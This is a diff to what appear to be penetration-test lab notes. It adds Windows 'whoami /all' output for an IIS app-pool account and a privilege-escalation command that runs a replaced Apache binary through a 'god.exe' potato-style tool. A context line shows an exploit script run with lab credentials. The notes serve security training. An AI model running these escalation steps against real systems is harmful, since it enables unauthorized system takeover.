@@ -115,6 +115,36 @@ python3 test.py -i 'http://web02.relia.com:14080' -u mark@relia.com -p OathDeepl
     LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
     RmSvc: GenericExecute (Start/Stop)
 
+PS C:\xampp\apache\bin> whoami /all                                                                                                                                                                                                     
+whoami /all                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                        
+USER INFORMATION                                                                                                                                                                                                                        
+----------------                                                                                                                                                                                                                        
+                                                                                                                                                                                                                                        
+User Name                  SID                                                                                                                                                                                                          
+========================== =============================================================                                                                                                                                                
+iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415                                                                                                                                                
+                                                                                                                                                                                                                                        
+                                                                                                                                                                                                                                        
+GROUP INFORMATION                                                                                                                                                                                                                       
+-----------------                                                                                                                                                                                                                       
+                                                                                                                                                                                                                                        
+Group Name                           Type             SID          Attributes                                          
+==================================== ================ ============ ==================================================  
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                     
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group  
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group                                                                                                                   
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group                                                                                                                   
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group                                                                                                                   
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group                                                                                                                   
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group                                                                                                                   
+BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group                                                                                                                   
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group                                                                                                                   
+                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group   
+
+
+./god.exe -cmd "cmd /c C:\xampp\apache\bin\ApacheMonitor.bak"
+
 ```
 
 
